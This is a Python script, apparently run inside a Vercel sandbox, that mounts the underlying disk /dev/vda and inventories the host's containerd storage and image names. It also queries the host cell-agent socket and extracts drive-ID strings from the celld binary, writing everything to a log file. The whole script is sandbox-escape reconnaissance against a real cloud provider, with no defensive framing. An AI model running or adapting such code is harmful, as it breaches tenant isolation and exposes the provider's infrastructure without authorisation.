# -*- coding: utf-8 -*-
"""vda9_find_ids: 挖 containerd 镜像名 + drive_id 线索 + GetResourceUsage 完整输出
1) ls containerd 存储目录 + strings metadata.db 挖镜像名
2) GetResourceUsage 完整响应 (可能含 drive 信息)
3) strings celld 挖 hvcp_/drive 上下文
4) 配置目录 /var/celld 等
输出落盘 + 哨兵 V9V_DONE"""
import os, time, socket, ctypes, subprocess, re

OUT = '/vercel/sandbox/v9v.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:600].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    # P1: containerd 存储盘点
    log('=== P1 containerd storage ===')
    for d in ['/mnt/vdax/var/lib/containerd', '/mnt/vdax/var/celld', '/mnt/vdax/etc/containerd']:
        try:
            log('ls %s: %s' % (d, sorted(os.listdir(d))[:30]))
        except Exception as e:
            log('ls %s ERR %s' % (d, e))
    # 找 db 文件
    dbs = []
    for root, dirs, files in os.walk('/mnt/vdax/var/lib/containerd', topdown=True):
        depth = root[len('/mnt/vdax'):].count('/')
        if depth > 5:
            dirs[:] = []
            continue
        for n in files:
            if n.endswith(('.db', '.bolt', '.json')):
                dbs.append(os.path.join(root, n))
        if len(dbs) > 20:
            break
    log('dbs: %s' % dbs)
    # strings 挖镜像名
    for db in dbs[:3]:
        try:
            data = open(db, 'rb').read()
            log('db %s size=%d' % (db, len(data)))
            txt = b'\n'.join(re.findall(rb'[\x20-\x7e]{6,}', data)).decode(errors='replace')
            imgs = sorted(set(re.findall(r'[A-Za-z0-9._/-]+:[A-Za-z0-9._-]+', txt)))
            log('imgs (%d): %s' % (len(imgs), [i for i in imgs if not i.startswith('http')][:40]))
            # 含 vercel/docker/alpine 的
            vercel_like = [i for i in imgs if any(k in i.lower() for k in ['vercel', 'alpine', 'debian', 'ubuntu', 'busybox', 'node', 'python'])]
            log('likely imgs: %s' % vercel_like[:30])
        except Exception as e:
            log('db ERR %s' % e)

    # P2: GetResourceUsage 完整
    log('=== P2 GetResourceUsage full ===')
    st, bd = rpc_unix('/mnt/vdax/run/cell/cell.sock',
                      '/vercel.hive.cell.api.usage.v1.UsageService/GetResourceUsage', '{}', t=4)
    log('usage -> %s | %s' % (st, bd[:600]))

    # P3: strings celld 挖 id 格式
    log('=== P3 celld id ctx ===')
    try:
        data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
        txt = b'\n'.join(re.findall(rb'[\x20-\x7e]{6,}', data)).decode(errors='replace')
        for kw in ['hvcp_', 'drive not found', 'failed to wait for drive', 'drive_id', 'DriveId', 'hvcd_', 'hvc_']:
            idxs = [m.start() for m in re.finditer(re.escape(kw), txt)][:3]
            for i in idxs:
                log('ctx %s: ...%s...' % (kw, txt[max(0, i - 100):i + 150].replace('\n', ' ')))
    except Exception as e:
        log('P3 ERR %s' % e)

    log('V9V_DONE')
    f.close()


if __name__ == '__main__':
    main()
